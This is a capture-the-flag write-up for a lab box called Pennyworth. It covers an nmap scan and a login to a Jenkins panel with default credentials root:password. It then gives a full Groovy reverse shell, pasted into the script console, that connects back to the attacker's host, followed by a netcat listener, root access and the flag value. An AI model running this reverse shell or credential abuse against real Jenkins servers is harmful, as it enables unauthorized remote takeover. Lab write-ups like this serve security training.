
## CTF Writeup: Pennyworth

---
## Reconnaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.46.68
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-13 09:28 -0500
Nmap scan report for 10.129.46.68
Host is up (0.032s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Jetty 9.4.39.v20210325
|_http-server-header: Jetty(9.4.39.v20210325)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.35 seconds
```

Upon inspecting the webpage it is an Jenkins Login Panel. Enumerated the Jenkins Version using Wappalyzer.

```
Jenkins 2.289.1
```

I was able to login into Jenkins using default credentials.

```
root:password
```

Navigated to Manage Jenkins > Scripts then I navigated to revshells.com & chose Groovy Reverse Shell:

```
String host="10.10.14.44";int port=53;String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Pasted it inside the script console.

Started up my netcat listener on my local machine & executed the script.

```
nc -lnvp 53
```

Gained RCE as user "root".

```
nc -lvnp 53  
listening on [any] 53 ...
connect to [10.10.14.44] from (UNKNOWN) [10.129.46.68] 34694
whoami
root
```

Retrieved flag.txt in /root directory.

```
9cdfb439c7876e703e307864c9167a15
```